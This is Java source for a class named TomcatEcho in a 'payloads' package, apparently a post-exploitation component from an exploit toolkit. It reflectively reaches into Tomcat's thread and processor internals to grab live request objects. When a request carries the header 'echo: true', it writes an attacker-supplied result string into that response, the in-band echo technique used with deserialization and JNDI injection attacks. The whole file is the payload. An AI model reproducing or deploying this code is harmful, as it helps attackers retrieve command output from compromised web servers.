package http.payloads.echo;

import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class TomcatEcho {

    String result;

    public TomcatEcho() {
        try {
            result = "";
            exec();
        } catch (Exception ignored) {}
    }

    private void exec() throws Exception {
        echo();
    }

    private Thread[] allThreads() {
        ThreadGroup tg = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[tg.activeCount()];
        tg.enumerate(threads);
        return threads;
    }

    private void echo() throws Exception {
        boolean flag = false;
        for (Thread thread : allThreads()) {
            try {
                String str = thread.getName();
                if (str.contains("exec") || !str.contains("http")) continue;

                Field field = thread.getClass().getDeclaredField("target");
                field.setAccessible(true);
                Object obj = field.get(thread);

                if (!(obj instanceof Runnable)) continue;
                field = obj.getClass().getDeclaredField("this$0");
                field.setAccessible(true);
                obj = field.get(obj);

                try {
                    field = obj.getClass().getDeclaredField("handler");
                } catch (NoSuchFieldException e) {
                    field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
                field.setAccessible(true);
                obj = field.get(obj);

                try {
                    field = obj.getClass().getSuperclass().getDeclaredField("global");
                } catch (NoSuchFieldException e) {
                    field = obj.getClass().getDeclaredField("global");
                }
                field.setAccessible(true);
                obj = field.get(obj);

                field = obj.getClass().getDeclaredField("processors");
                field.setAccessible(true);
                List<?> processors = (List<?>) field.get(obj);

                for (Object processor : processors) {
                    field = processor.getClass().getDeclaredField("req");
                    field.setAccessible(true);
                    Object req = field.get(processor);
                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);

                    str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"echo"});
                    if (str != null && str.equals("true")) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, 200);
                        byte[] result = this.result.getBytes(StandardCharsets.UTF_8);
                        try {
                            Class<?> cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            obj = cls.newInstance();
                            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, result, 0, result.length);
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                        } catch (NoSuchMethodException var5) {
                            Class<?> cls = Class.forName("java.nio.ByteBuffer");
                            obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                        }
                        flag = true;
                        break;
                    }
                }
                if (flag) break;
            } catch (NullPointerException ignored) {}
        }
    }
}
